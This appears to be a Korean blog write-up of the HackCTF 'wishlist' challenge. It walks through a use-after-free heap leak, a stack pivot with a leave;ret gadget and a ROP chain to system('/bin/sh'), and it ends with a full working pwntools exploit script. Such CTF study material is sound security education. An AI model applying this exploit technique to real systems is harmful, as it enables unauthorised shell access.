---
layout: post
title:  "HackCTF wishlist write-up"
date:   2020-03-26 19:45:55
image:  hackctf_wishlist.PNG
tags:   [HackCTF]
categories: [Write-up]
---

### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled.png)

NX비트말곤 딱히 안걸려있다.

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%201.png)

메뉴가 나오고 1번으로 wish를 입력가능하다. 2번으로 입력한 wish를 확인 가능하고 3번으로 삭제가 가능하다. 

<br>

**3) 코드흐름 파악**

- **main**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%202.png)

    메인을 확인해보면 striped 된 바이너리인지 함수명이 안보인다.

<br>

- **sub_4008DA()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%203.png)

    해당 함수에서 input을 입력받는 것으로 보인다. 여기서 0x20만큼 입력을 받는데, buf는 rbp-0x10에 위치하므로 ret를 덮을 수 있을것으로 보인다

<br>

- **sub_400910()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%204.png)

    해당함수는 1번 메뉴입력시 실행되는 함수로 보인다. 0x18 고정 크기를 ptr 배열에 넣고 해당 주소에 read함수로 입력을 받는다

<br>

- **sub_4009DD()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%205.png)

    해당 함수는 remove 하는 부분인것같다. 아까 ptr 전역변수 배열의 어떤 인덱스를 지울지 입력을 받는데, 인덱스는 최대 9를 넘어가지 못하는 것으로 보인다.

    따라서 malloc은 ptr[0] ~ ptr[9] 까지만 저장 가능하다

    그리고 free를 했으면 ptr배열의 해당 인덱스 값을 0으로 초기화 한다. 따라서 DFB는 이용불가다

<br>

- **sub_40097F()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%206.png)

    해당 함수는 출력해주는 함수로 보인다. puts함수로 출력해주는데, 이 역시 인덱스를 검사하는 로직이 들어가 있다.



<br><br><br>


### 2. 접근방법

---

해당 문제는 system 함수를 줬기 때문에 libc 주소를 leak할 필요는 없다.

또한 DFB는 이용하지 못하지만, UAF는 이용가능하다.

<br>

현재 이용가능한 방법과 보이는 취약점을 정리하면 다음과 같다

1. *sub_4008DA() 함수로 bof 를 일으켜 ret 덮을 수 있음*
2. *uaf 가능*
3. *system 주소 알고있음*

그렇다면, ROP를 이용해서  "pop rdi;ret;" + "/bin/sh주소" + "system함수" 를 호출하면 끝이다.

단, sub_4008DA() 함수에서 read는 0x20 바이트 밖에 입력하지 못하므로 딱 ret까지만 덮을수 있다.

우리가 현재 입력하는 공간은 sub_4008DA() 함수에서 read 입력시 값이 들어가는 스택과 sub_400910() 함수에서 사용되는 힙 영역이다. 따라서 힙 영역에 "/bin/sh" 문자열과

"pop rdi;ret;" + "/bin/sh주소" + "system함수" 요 문자열을 삽입한뒤, ret를 적절한 가젯을 이용해서 시스템 함수가 호출되게 할 것이다.

*여기서 스택 피보팅이라는 기술을 이용해서 가짜 스택을 만들 것이다. 이름만 거창하지 그냥 가젯으로 조지는 그런 방법이다.*

<br><br>

- **시나리오**
    1. ptr[0], ptr[1], ptr[2] 에 malloc 3개 조지기
    2. free(0), free(1) 호출
    3. malloc을 한번더 호출한다면, 고정 사이즈이므로 ptr[1]에 malloc 된 청크를 재할당 받고 이는 ptr[3]에 저장됨. 
        - 현재 ptr[3]은 ptr[1] 청크를 재할당 받은 것이기 때문에 free(1)가 호출되고나서 fd에 ptr[0]에 담겼던 청크의 주소가 들어가있음
        - 2번 메뉴로 index = 3을 선택하면 저 fd값이 leak되고 하위 2바이트를 & 연산으로 조져서 heap_base 주소를 알수 있음

    4. 1번 메뉴로 "/bin/sh" 문자열 저장함
        - 3번에서 구한 heap_base 주소를 이용해서 "/bin/sh"이 저장된 오프셋을 조질수 있음. 일단 알아두쟈

    5. system 함수는 버퍼를 많이 사용하므로 1번 메뉴로 한 100개정도 malloc 조지기
    6. 1번 메뉴로 "pop rdi;ret; 주소" + "/bin/sh주소 " + "system함수"를 힙에 저장
        - "/bin/sh" 주소는 3번에서 구한 heap_base + offset으로 넣어주면 됨

    7. sub_4008DA() 함수에서 0x20바이트를 다음과 같이 구성해서 ROP 진행
        - "A"*0x10+ "6번에서 입력한 페이로드 주소"(rbp 위치) +  "leave; ret; 가젯"(ret 위치)

<br>

이제 위 시나리오로 자세히 분석을 해보자

<br><br><br>


### 3. 풀이

---

1.  **시나리오의 1~3 ( heap_base 주소를 아는것이 목적임 )**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%207.png)

    uaf를 이용해서 ptr[3]에 현재 ptr[1]에서 할당받았던 청크주소가 들어가 있다. fd가 그대로 있기 때문에 view를 호출하여 index 3번을 선택하면<br><br>

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%208.png)

    다음과 같이 leak이 된다. (위 출력은 코드에서 뒤에 & 연산으로 없앤것)<br><br>

2. **시나리오4) **1번 메뉴로 "/bin/sh" 문자열 저장함****

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%209.png)

    heap_base + 0x10 위치에 들어가는 걸 확인할수 있음<br><br>

3. **시나리오5)  system 함수는 버퍼를 많이 사용하므로 1번 메뉴로 한 100개정도 malloc 조지기**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2010.png)

    100번 정도 1번 메뉴를 통해 malloc을 진행하였다<br><br>

4. **시나리오6) 1번 메뉴로 "pop rdi;ret; 주소" + "/bin/sh주소 " + "system함수"를 힙에 저장**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2011.png)

    - 0x400b03 : pop rdi; ret 가젯
    - 0x23cd010 : "/bin/sh" 저장 주소
    - 0x4006c0 : "system 함수 plt"<br><br>

5. **시나리오7) sub_4008DA() 함수에서 0x20바이트를 다음과 같이 구성해서 ROP 진행**
    - "A"*0x10+ "6번에서 입력한 페이로드 주소"(rbp 위치) +  "leave; ret; 가젯"(ret 위치)

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2012.png)

    (중간에 디버깅을 종료하고 다시해서 주소가 달라졌다. 오프셋 위주로 확인하시길..)

    - 0xc60에 0x31이 16개 들어갔다
    - 0xc70에 4번에서 삽입한 페이로드의 주소 0xcf0 - 8 을 넣었다

            -8을 한 이유는 후에 스택 피보팅이 진행될때 해당 페이로드가 ret에 들어가게 하기 위해서
            pop rbp가 진행될때 해당 페이로드가 rbp로 들어가고, rsp가 +8 되면서 이때 페이로드의 
            실제 주소가 rsp에 들어가고 이 주소가 ret가 되는 이유 때문이다.

    - ret위치에 0x4008d8 를 넣었는데 이는 "leave; ret;" 가젯 주소이다<br><br>

6. **스택 피보팅으로 fake stack 조지기 !**

    지금부터 중요하다. 위 5번에서 0x20 바이트를 input: 에 입력하고  에필로그 가 진행될때 상황을 살펴보자<br>

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2013.png)

    - 해당 함수의 원래의 에필로그다. 현재 leave가 되기 직전 상황인데, leave는 위 사진과 같이 두개의 명령어가 실행된다고 보면 된다.
    - 현 rbp의 값이 rsp에 복사가 되기 때문에 rsp 값은 0x..c70이 된다
    - 그다음 rsp가 가리키는 값을 pop하여 rbp에 저장한다. 따라서 현재 rsp는 0x12efce8을 가리키고 있으므로 해당 값이 rbp에 들어간다
    - pop이 진행됬으므로 rsp가 증가하여 0x...c78이 된다<br><br>

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2014.png)

    - leave가 끝난 상황이다. 이제 ret가 실행되면 'pop rip;' 이 실행된다고 보면 된다. 현재 rsp가 가리키는 값이 0x4008d8 인데 여기는 우리가 아까 넣어둔 leave 가젯이다
    - 현재 rbp는 아까 pop rbp로 인해 0x12efce8이 된 상황이다.
    - 결국 여기서 ret이 실행되면 다시 leave로 갈것이다.<br><br>

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2015.png)

    - 다시 leave로 돌아왔다. 여기서 leave가 실행되면 rbp, rsp값이 둘다 0x12efce8이 될것이다
    - 그리고 pop rbp가 진행되면서 rsp가 가리키는 값인 0x21이 rbp에 들어가고 rsp는 8증가해 0x12efcf0이 될 것이다<br><br>

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2016.png)

    - leave가 끝나면 현재 rbp에는 0x21이 들어가 있고 rsp는 0x12efcf0가 된다.
    - 스택을 확인해보자. 원래 0x7ff... 형태의 주소가 스택의 주소였는데, leave, ret; 가젯을 이용해서 가짜 스택 즉, 우리가 원하는 주소를 스택으로 사용할수 있게 되었다!
    - 이 주소는 우리가 1번 메뉴를 통해 할당받는 힙 주소들이다.
    - ret가 진행되면 현재 rsp가 가리키는 값인 0x400b03가 rip들어갈 것이고, 이는 pop rdi 주소이다<br><br>

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20wishlist/Untitled%2017.png)

    -  이제 우리가 아까 힙에 삽입해놨던 ROP 페이로드가 실행되면서 쉘이 떨어진다

<br><br>

최종 익스코드는 다음고 같다
```python
from pwn import *

context(arch="amd64",os="linux",log_level="DEBUG")
#p=remote("ctf.j0n9hyun.xyz", 3035)
p=process("./wishlist",aslr="False")
#gdb.attach(p,'code\nb *0x91f+$code\n')

e=ELF("./wishlist")

def make(wishlist):
    p.sendlineafter("input: ","1")
    p.sendafter("wishlist: ",wishlist)

def view(index):
        p.sendlineafter("input: ","2")
        p.sendlineafter("index: ",str(index))

def remove(index):
        p.sendlineafter("input: ","3")
        p.sendlineafter("index: ",str(index))

make("A"*8)
make("B"*8)
make("C"*8)

remove(0)
remove(1)

make("A")
view(3)

heap_base=u32(p.recv(4)) & 0xFFFFF00
log.info(hex(heap_base))

make("/bin/sh\x00")

for i in range(0,100):
    make("C"*8)
gdb.attach(p,'code\nb *0x8ca+$code\n')

#pause()
payload = p64(0x400b03) + p64(heap_base+0x10) + p64(e.plt["system"])
#pause()
make(payload)
#pause()

# payload = bheap_base + 0xcf0
#gdb.attach(p,'code\nb *0x8ca+$code\n')

pause()
p.sendlineafter("input: ","1"*0x10+p64(heap_base+0xcf0-8)+p64(0x4008d8))
pause()

p.interactive()
```
<br><br><br>

### 4. 몰랐던 개념

---

- staci pivoting

    [ROP (Return Oriented Programming)](https://dool2ly.tistory.com/72)

    [16.Stack pivot](https://www.lazenca.net/display/TEC/16.Stack+pivot)
    